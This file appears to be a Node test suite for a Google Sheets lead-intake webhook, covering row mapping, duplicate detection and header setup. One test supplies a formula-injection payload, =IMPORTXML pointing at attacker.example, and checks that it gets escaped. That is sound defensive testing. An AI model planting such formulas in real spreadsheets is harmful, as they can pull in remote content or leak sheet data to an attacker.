import assert from "node:assert/strict";
import crypto from "node:crypto";
import { readFile } from "node:fs/promises";
import test from "node:test";
import vm from "node:vm";

const source = await readFile(new URL("../integrations/google-sheets-lead-webhook.gs", import.meta.url), "utf8");

function formatMountainParts(date, timeZone) {
  const formatter = new Intl.DateTimeFormat("en-US", {
    timeZone,
    year: "numeric",
    month: "numeric",
    day: "numeric",
    hour: "numeric",
    minute: "numeric",
    second: "numeric",
    hourCycle: "h23",
  });
  const parts = Object.fromEntries(formatter.formatToParts(date).map((part) => [part.type, part.value]));
  return [parts.year, parts.month, parts.day, parts.hour, parts.minute, parts.second].join(",");
}

const context = {
  console,
  Date,
  JSON,
  Map,
  Set,
  Number,
  String,
  Object,
  Math,
  Utilities: {
    DigestAlgorithm: { SHA_256: "SHA_256" },
    Charset: { UTF_8: "UTF_8" },
    formatDate: formatMountainParts,
    computeDigest(_algorithm, value) {
      return Array.from(crypto.createHash("sha256").update(value, "utf8").digest()).map((byte) =>
        byte > 127 ? byte - 256 : byte,
      );
    },
  },
};
vm.createContext(context);
vm.runInContext(
  `${source}\n;globalThis.__test = { LEAD_FIELDS, buildRow, createLeadFingerprint, findDuplicate, getSheetState, mountainDateFormula };`,
  context,
);
const helpers = context.__test;

test("row mapping is header-based and preserves custom or duplicate legacy columns", () => {
  const submittedDate = new Date("2026-07-04T18:30:45.000Z");
  const fields = [
    { key: "phone", label: "Phone" },
    { key: "leadId", label: "Lead ID" },
    { key: "submittedAt", label: "Submitted At" },
    { key: "leadTimestampMt", label: "Lead Timestamp (MT)" },
  ];
  const row = helpers.buildRow(
    ["Phone", "Custom Legacy Column", "Phone", "Submitted At", "Lead Timestamp (MT)", "Lead ID"],
    fields,
    { phone: "801-555-0123", leadId: "sr_test" },
    submittedDate,
    "fingerprint",
  );

  assert.equal(row[0], "801-555-0123");
  assert.equal(row[1], "");
  assert.equal(row[2], "");
  assert.equal(row[3].toISOString(), submittedDate.toISOString());
  assert.equal(row[4], "=DATE(2026,7,4)+TIME(12,30,45)");
  assert.equal(row[5], "sr_test");
});

test("fingerprint dedupe catches the same lead in the short window", () => {
  const payload = {
    "first-name": "Jane",
    phone: "(801) 555-0123",
    email: "JANE@example.com",
    "service-area": "Park City",
    "service-type": "Deep clean",
  };
  const fingerprint = helpers.createLeadFingerprint(payload);
  const submittedDate = new Date("2026-09-04T18:05:00.000Z");
  const headers = ["Lead ID", "Dedupe Fingerprint", "Submitted At"];
  const sheet = {
    getLastRow: () => 2,
    getRange: () => ({
      getValues: () => [["sr_original", fingerprint, new Date("2026-09-04T18:00:00.000Z")]],
    }),
  };

  assert.deepEqual(
    JSON.parse(JSON.stringify(helpers.findDuplicate(sheet, headers, "sr_new", fingerprint, submittedDate))),
    { duplicateBy: "fingerprint", leadId: "sr_original" },
  );
});

test("Lead ID dedupe is exact and independent of the fingerprint", () => {
  const headers = ["Lead ID", "Dedupe Fingerprint", "Submitted At"];
  const sheet = {
    getLastRow: () => 2,
    getRange: () => ({ getValues: () => [["sr_same", "different", new Date(0)]] }),
  };
  assert.equal(helpers.findDuplicate(sheet, headers, "sr_same", "new", new Date()).duplicateBy, "leadId");
});

test("untrusted formula-like values are escaped while MT formulas remain formulas", () => {
  const submittedDate = new Date("2026-07-04T18:30:45.000Z");
  const row = helpers.buildRow(
    ["Notes", "Lead Timestamp (MT)"],
    [
      { key: "notes", label: "Notes" },
      { key: "leadTimestampMt", label: "Lead Timestamp (MT)" },
    ],
    { notes: "=IMPORTXML(\"https://attacker.example\")" },
    submittedDate,
    "fingerprint",
  );

  assert.equal(row[0], "'=IMPORTXML(\"https://attacker.example\")");
  assert.equal(row[1], "=DATE(2026,7,4)+TIME(12,30,45)");
});

test("schema setup expands a new sheet and appends headers without rewriting existing ones", () => {
  const writes = [];
  const expansions = [];
  const existingHeaders = ["Legacy Column", "Phone"];
  const sheet = {
    getLastColumn: () => existingHeaders.length,
    getMaxColumns: () => 26,
    insertColumnsAfter: (after, count) => expansions.push({ after, count }),
    getRange(row, column, _rowCount, columnCount) {
      if (row === 1 && column === 1 && columnCount === existingHeaders.length) {
        return { getValues: () => [existingHeaders] };
      }
      return {
        setValues(values) {
          writes.push({ column, values });
          return this;
        },
        setFontWeight() {
          return this;
        },
        setBackground() {
          return this;
        },
      };
    },
    autoResizeColumns() {},
    setFrozenRows() {},
  };
  const spreadsheet = { getSheetByName: () => sheet };
  context.PropertiesService = {
    getScriptProperties: () => ({ getProperty: () => "test-spreadsheet-id" }),
  };
  context.SpreadsheetApp = { openById: () => spreadsheet, getActiveSpreadsheet: () => null };

  const result = helpers.getSheetState("Leads", helpers.LEAD_FIELDS);

  assert.deepEqual(result.headers.slice(0, 2), existingHeaders);
  assert.equal(writes.length, 1);
  assert.equal(writes[0].column, 3);
  assert.ok(expansions[0].count > 0);
  assert.equal(writes[0].values[0].includes("Lead ID"), true);
});
